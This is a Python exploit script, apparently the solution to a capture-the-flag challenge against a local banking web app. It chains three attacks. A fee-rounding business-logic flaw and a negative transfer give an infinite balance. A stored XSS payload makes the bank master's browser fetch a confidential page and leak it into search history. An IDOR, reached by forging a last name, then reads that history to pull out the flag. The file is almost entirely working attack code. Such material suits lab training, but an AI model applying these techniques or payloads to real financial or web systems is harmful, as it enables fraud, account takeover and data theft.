import uuid
import httpx
import re
import time

# Configurations and Initial Setup

url = "http://localhost:80"
flag_format_prefix = "RAZZ"

name = uuid.uuid4().hex
password = uuid.uuid4().hex
email = f"{name}@example.com"
phone = "1234567890"

bankmaster_email = f"{email}.bankmaster"

timeout = httpx.Timeout(10.0, read=30.0) # We will need the timeout later for waiting on XSS payload execution
session = httpx.Client(timeout=timeout)

r = session.post(f"{url}/register", data={"firstName": name, "lastName": name, "email": email, "phoneNumber": phone, "password": password, })

if r.status_code in [200, 302]:
  print("[+] Registered successfully with email {} and password {}".format(email, password))
else:
  print("[-] Registration failed")
  exit(1)


# Vuln 1: Business Logic Flaw to obtain an Infinite balance

# Step 1: Setting balance to zero by transferring calculated amount to bankmaster

initial_balance = 10
fees = 0.01

zero_fee_transfer_amount = initial_balance / (1 + fees)

r = session.post(f"{url}/transfer", data={"receiverInfo": bankmaster_email, "amount": zero_fee_transfer_amount })

zero_balance_check = re.search(r"\$0", r.text)

if r.status_code == 200 and zero_balance_check is not None:
  print("[+] Transferred {} to bankmaster to obtain zero balance".format(zero_fee_transfer_amount))
else:
  print("[-] Transfer failed")
  exit(1)

# Step 2: Exploiting the failed transfer fee flaw to add infinite balance

r = session.post(f"{url}/transfer", data={"receiverInfo": uuid.uuid4().hex, "amount": -1 }) # Transfer negative amount to a non existent account to trigger fee addition

infinite_balance_check = re.search(r"\$Infinity", r.text)

if r.status_code == 200 and infinite_balance_check is not None:
  print("[+] Obtained infinite balance successfully")
else:
  print("[-] Could not obtain infinite balance")
  exit(1)


# Vuln 2: Exploiting XSS to leak the bankmaster's flag into search autocomplete history

xss_payload = 'xyz\\\"}`;fetch(`/master/confedential`).then(function(resp) {return resp.text()}).then(function(flag) { fetch(`/transactions/search?searchTerm=${flag}`)});`'

print("[+] Waiting for XSS payload to execute...")
r = session.post(f"{url}/master", data={"email": email, "amount": 10, "userMessage": xss_payload })

if r.status_code == 200:
  print("[+] XSS payload injected successfully. Moving on to exfiltration.")
else:
  print("[-] XSS payload injection failed")
  exit(1)

# Vuln 3: Exfiltrating the flag via IDOR in /api/search-history/autocomplete

# Step 1: Retrieving bankmaster user ID

r = session.get(f"{url}/transactions")

bankmaster_id_search = re.search(r"([a-f0-9]{24})<br>\(" + name + r"\s+" + name + r"'s Bank Master\)", r.text)


if bankmaster_id_search is not None:
  bankmaster_id = bankmaster_id_search.group(1)
  print("[+] Retrieved bankmaster user ID: {}".format(bankmaster_id))
else:
  print("[-] Could not retrieve bankmaster user ID")
  exit(1)

# Step 2: Change lastname to exploit IDOR

forged_lastname = "{}'s Bank Master's Bank Master".format(name)

r = session.post(f"{url}/profile", data={"firstName": name, "lastName": forged_lastname, "email": email, "phoneNumber": phone })

if r.status_code == 200:
  print("[+] Changed last name to \"{}\" to assume bankmaster identity".format(forged_lastname))
else:
  print("[-] Could not change last name")
  exit(1)

# Step 3: Access search autocomplete history to retrieve flag

r = session.get(f"{url}/api/search-history/autocomplete/{bankmaster_id}")

flag_search = re.search(r"{}{{.*?}}".format(flag_format_prefix), r.text)

if flag_search is not None:
  print("[+] Retrieved flag: {}".format(flag_search.group(0)))
else:
  print("[-] Could not retrieve flag")
  exit(1)